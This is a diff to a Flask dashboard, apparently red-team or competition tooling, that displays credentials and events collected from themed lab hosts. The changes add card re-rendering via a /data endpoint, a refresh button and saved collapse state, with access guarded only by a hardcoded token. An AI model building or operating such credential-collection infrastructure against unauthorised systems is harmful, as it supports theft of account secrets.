@@ -10,8 +10,8 @@ VIEW_TOKEN = "chumbucket"
 
 LINUX_HOSTS = {
     "10.111.1.1": "shellphone",
-    "10.111.1.2": "pattyvault",
-    "10.111.1.3": "bottlemail",
+    "10.111.1.2": "bottlemail",
+    "10.111.1.3": "pattyvault",
     "10.111.1.4": "thesafe",
     "10.111.1.5": "krustyfront",
 }
@@ -349,7 +349,7 @@ def render_host_card(ip, hostname):
 
 @app.route("/data", methods=["GET"])
 def get_data():
-    """JSON endpoint for live stat polling — returns totals only, no HTML."""
+    """JSON endpoint for live polling — returns stats + rendered card HTML."""
     if request.args.get("token") != VIEW_TOKEN:
         return "", 404
     with store_lock:
@@ -359,10 +359,32 @@ def get_data():
             1 for ip in set(list(cred_store.keys()) + list(event_log.keys()))
             if cred_store.get(ip) or event_log.get(ip)
         )
+        all_ips = list(LINUX_HOSTS.keys())
+        for ip in list(cred_store.keys()) + list(event_log.keys()):
+            if ip not in all_ips:
+                all_ips.append(ip)
+
+    def last_activity(ip):
+        times = []
+        if ip in cred_store:
+            times += [v["received_at"] for v in cred_store[ip].values()]
+        if ip in event_log:
+            for evlist in event_log[ip].values():
+                if evlist:
+                    times.append(evlist[0]["received_at"])
+        return max(times) if times else ""
+
+    active     = sorted([ip for ip in all_ips if last_activity(ip)], key=last_activity, reverse=True)
+    silent     = [ip for ip in all_ips if not last_activity(ip)]
+    sorted_ips = active + silent
+
+    cards_html = "".join(render_host_card(ip, LINUX_HOSTS.get(ip, ip)) for ip in sorted_ips)
+
     return jsonify({
         "total_creds":  total_creds,
         "total_events": total_events,
         "active_hosts": active_hosts,
+        "cards_html":   cards_html,
     })
 
 
@@ -686,13 +708,6 @@ def view_creds():
       document.getElementById(cardId).classList.toggle('collapsed');
     }}
 
-    function collapseAll() {{
-      document.querySelectorAll('.host-card').forEach(c => c.classList.add('collapsed'));
-    }}
-    function expandAll() {{
-      document.querySelectorAll('.host-card').forEach(c => c.classList.remove('collapsed'));
-    }}
-
     function toggleSection(bodyId) {{
       var section = document.getElementById(bodyId).closest('.act-section');
       section.classList.toggle('act-collapsed');
@@ -723,13 +738,74 @@ def view_creds():
       btn.textContent = showing ? btn.dataset.orig : 'Show less';
     }}
 
-    // Poll /data every 20s and patch only the stat pills — no page reload,
-    // so each viewer's expand/collapse state is never disturbed.
+    // Save collapsed/expanded state to localStorage, keyed by card id.
+    function saveState() {{
+      var state = {{}};
+      document.querySelectorAll('.host-card').forEach(function(c) {{
+        state[c.id] = c.classList.contains('collapsed');
+      }});
+      try {{ localStorage.setItem('cc_collapsed', JSON.stringify(state)); }} catch(e) {{}}
+    }}
+
+    function loadState() {{
+      try {{ return JSON.parse(localStorage.getItem('cc_collapsed') || '{{}}'); }} catch(e) {{ return {{}}; }}
+    }}
+
+    function applyState(state) {{
+      document.querySelectorAll('.host-card').forEach(function(c) {{
+        if (state[c.id] === true)  c.classList.add('collapsed');
+        if (state[c.id] === false) c.classList.remove('collapsed');
+      }});
+    }}
+
+    // Wrap toggleCard so it persists state
+    var _origToggleCard = toggleCard;
+    toggleCard = function(cardId) {{
+      _origToggleCard(cardId);
+      saveState();
+    }};
+
+    function collapseAll() {{
+      document.querySelectorAll('.host-card').forEach(c => c.classList.add('collapsed'));
+      saveState();
+    }}
+    function expandAll() {{
+      document.querySelectorAll('.host-card').forEach(c => c.classList.remove('collapsed'));
+      saveState();
+    }}
+
+    function manualRefresh() {{
+      var TOKEN = '{VIEW_TOKEN}';
+      fetch('/data?token=' + TOKEN)
+        .then(function(r) {{ return r.ok ? r.json() : null; }})
+        .then(function(d) {{
+          if (!d) return;
+          var pills = document.querySelectorAll('.stat-pill');
+          if (pills.length >= 3) {{
+            pills[0].innerHTML = '<strong>' + d.total_creds  + '</strong> credential'  + (d.total_creds  !== 1 ? 's' : '');
+            pills[1].innerHTML = '<strong>' + d.total_events + '</strong> event'       + (d.total_events !== 1 ? 's' : '');
+            pills[2].innerHTML = '<strong>' + d.active_hosts + '</strong> active host' + (d.active_hosts !== 1 ? 's' : '');
+          }}
+          if (d.cards_html) {{
+            var state = {{}};
+            document.querySelectorAll('.host-card').forEach(function(c) {{
+              state[c.id] = c.classList.contains('collapsed');
+            }});
+            document.getElementById('cards-container').innerHTML = d.cards_html;
+            applyState(state);
+            try {{ localStorage.setItem('cc_collapsed', JSON.stringify(state)); }} catch(e) {{}}
+          }}
+        }})
+        .catch(function() {{}});
+    }}
+
+    // Apply saved state on initial load
+    applyState(loadState());
+
+    // Live poll: update pills + re-render cards every 20s, preserving collapse state.
     (function startPolling() {{
       var TOKEN = '{VIEW_TOKEN}';
-      function pluralise(n, word) {{
-        return n + ' ' + word + (n !== 1 ? 's' : '');
-      }}
+
       function updatePills(d) {{
         var pills = document.querySelectorAll('.stat-pill');
         if (pills.length < 3) return;
@@ -737,10 +813,26 @@ def view_creds():
         pills[1].innerHTML = '<strong>' + d.total_events + '</strong> event'       + (d.total_events !== 1 ? 's' : '');
         pills[2].innerHTML = '<strong>' + d.active_hosts + '</strong> active host' + (d.active_hosts !== 1 ? 's' : '');
       }}
+
+      function updateCards(html) {{
+        var state = loadState();
+        // Also capture current DOM state (user may have toggled since last save)
+        document.querySelectorAll('.host-card').forEach(function(c) {{
+          state[c.id] = c.classList.contains('collapsed');
+        }});
+        var container = document.getElementById('cards-container');
+        if (container) container.innerHTML = html;
+        applyState(state);
+      }}
+
       setInterval(function() {{
         fetch('/data?token=' + TOKEN)
           .then(function(r) {{ return r.ok ? r.json() : null; }})
-          .then(function(d) {{ if (d) updatePills(d); }})
+          .then(function(d) {{
+            if (!d) return;
+            updatePills(d);
+            if (d.cards_html) updateCards(d.cards_html);
+          }})
           .catch(function() {{}});
       }}, 20000);
     }})();
@@ -761,11 +853,13 @@ def view_creds():
     <div class="topbar-actions">
       <button class="btn" onclick="collapseAll()">Collapse all</button>
       <button class="btn" onclick="expandAll()">Expand all</button>
-      <a class="btn btn-primary" href="/?token={VIEW_TOKEN}">Refresh</a>
+      <button class="btn btn-primary" onclick="manualRefresh()">Refresh</button>
     </div>
   </div>
 
+  <div id="cards-container">
   {cards}
+  </div>
 
 </body>
 </html>"""
